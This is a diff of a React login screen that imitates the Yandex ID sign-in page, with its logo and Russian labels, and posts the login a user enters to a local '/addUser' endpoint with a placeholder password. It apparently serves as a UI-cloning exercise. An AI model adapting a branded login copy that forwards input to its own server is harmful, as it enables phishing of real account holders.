@@ -15,10 +15,42 @@ import PhoneForm from "./components/PhoneForm"
 const App = () => {
     const [isNumber, setIsNumber] = useState(false)
     const [inputValue, setInputValue] = useState("")
+    const [error, setError] = useState(false)
 
-    const handleButtonClick = () => {
-        console.log(inputValue);
-      };
+    const [step, setStep] = useState("login");
+    const [login, setLogin] = useState("");
+    const [password, setPassword] = useState("");
+    
+
+    const handleButtonClick = (e) => {
+        e.preventDefault()
+        if (!inputValue.trim()) {
+            setError(true);
+            return;
+        }
+        setError(false)
+        
+        fetch("http://localhost:8000/addUser", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ login: inputValue, password: "testpassword" })
+        })
+        .then(async (response) => {
+            const data = await response.json();
+
+            if (response.ok) {
+                console.log("Пользователь добавлен:", data);
+                setInputValue(""); 
+            } else {
+                console.error("Ошибка:", data.error);
+                setError(true);
+            }
+        })
+        .catch((error) => {
+            console.error("Ошибка при отправке запроса:", error);
+            setError(true);
+        });
+    };
      
     const toggle = () => {
         setIsNumber(!isNumber)
@@ -33,51 +65,64 @@ const App = () => {
                         <img className="max-w-40 text-wh invert" src={YaIdLogo} />
                         <h1></h1>
                     </div>
+
                     <h2 className="text-lg font-semibold mb-4">Войдите с Яндекс ID</h2>
                     <ToggleButton toggle={toggle} />
-                    {isNumber
-                        ? (<div className="relative w-full mt-5 mb-4">
-                            <button className="absolute inset-y-0 flex items-center justify-center text-white rounded-2xl bg-[#d3d3de33] h-full aspect-square">
-                                <img src={rusFlagImg} alt="RU" className="w-6 h-4 rounded-sm" />
-                            </button>
-                            <input
-                                value={inputValue}
-                                onChange={(e) => setInputValue(e.target.value)}
-                                type="text"
-                                placeholder="+7 (000) 000 00 00"
-                                className="w-full py-3 pl-16 rounded-2xl border-[1px] border-[#d3d3de33] min-h-10 bg-[#1c1c1c] text-white placeholder-gray-400 outline-none focus:ring-2 focus:ring-gray-500 text-2xl"
-                            />
-                            {/* <PhoneForm /> */}
-                        </div>)
+
+                    <form onSubmit={handleButtonClick}>
+                        {isNumber
+                            ? (<div className="relative w-full mt-5 mb-4">
+                                <button className="absolute inset-y-0 flex items-center justify-center text-white rounded-2xl bg-[#d3d3de33] h-full aspect-square">
+                                    <img src={rusFlagImg} alt="RU" className="w-6 h-4 rounded-sm" />
+                                </button>
+                                <input
+                                    value={inputValue}
+                                    onChange={(e) => setInputValue(e.target.value)}
+                                    type="number"
+                                    onFocus={() => setError(false)}
+                                    placeholder={error ? "Введите данные" : "+7 (000) 000 00 00"}
+                                    className={`w-full py-3 pl-16 rounded-2xl border-[1px] border-[#d3d3de33] min-h-10 bg-[#1c1c1c] text-white placeholder-gray-400 outline-none focus:ring-2 focus:ring-gray-500 text-2xl ${
+                                        error ? "border-red-500 text-red-400 placeholder-red-400" : "border-[#d3d3de33] focus:ring-gray-500"
+                                      }`}
+                                />
+                                {/* <PhoneForm /> */}
+                            </div>)
 
 
-                        : (<div className="relative w-full mt-5 mb-4">
-                            <input
-                                value={inputValue}
-                                onChange={(e) => setInputValue(e.target.value)}
-                                type="text"
-                                placeholder="Логин или email"
-                                className="w-full p-3 rounded-2xl border-[1px] border-[#d3d3de33] min-h-10 bg-[#1c1c1c] text-white placeholder-gray-400 outline-none focus:ring-2 focus:ring-gray-500 text-2xl"
-                            />
-                        </div>)
-                    }
-                    <ButtonComponent
-                        handleButtonClick={handleButtonClick} 
-                        name="Войти"
-                        backGround="bg-white"
-                        textColor="text-[#1f1f24]"
-                    />
-                    <ButtonComponent
-                        name="По лицу или отпечатку"
-                        backGround="bg-[#d3d3de33]"
-                        textColor="text-white"
-                    />
-                    <ButtonComponent
-                        name="Создать ID"
-                        backGround="bg-[#1c1c1c] "
-                        textColor="text-white"
-                    />
+                            : (<div className="relative w-full mt-5 mb-4">
+                                <input
+                                    value={inputValue}
+                                    onChange={(e) => setInputValue(e.target.value)}
+                                    type="text"
+                                    onFocus={() => setError(false)}
+                                    placeholder={error ? "Введите данные" : "Логин или email"}
+                                    className={`w-full p-3 rounded-2xl border-[1px] min-h-10 bg-[#1c1c1c] text-white placeholder-gray-400 outline-none focus:ring-2 text-2xl ${
+                                        error ? "border-red-500 text-red-400 placeholder-red-400" : "border-[#d3d3de33] focus:ring-gray-500"
+                                      }`}
+                                />
+                            </div>)
+                        }
+                        <ButtonComponent
+                            // handleButtonClick={handleButtonClick} 
+                            type="submit"
+                            name="Войти"
+                            backGround="bg-white"
+                            textColor="text-[#1f1f24]"
+                        />
+                        <ButtonComponent
+                            name="По лицу или отпечатку"
+                            backGround="bg-[#d3d3de33]"
+                            textColor="text-white"
+                        />
+                        <ButtonComponent
+                            name="Создать ID"
+                            backGround="bg-[#1c1c1c] "
+                            textColor="text-white"
+                        />
+                    </form>
+                    
                     <h3>Войти с помощью</h3>
+
                     <div className="flex items-center justify-center gap-8 mt-5">
                         <img src={vkImg} alt="VK" className="w-8 h-8 cursor-pointer" />
                         <img src={googleImg} alt="Google" className="w-8 h-8 cursor-pointer" />
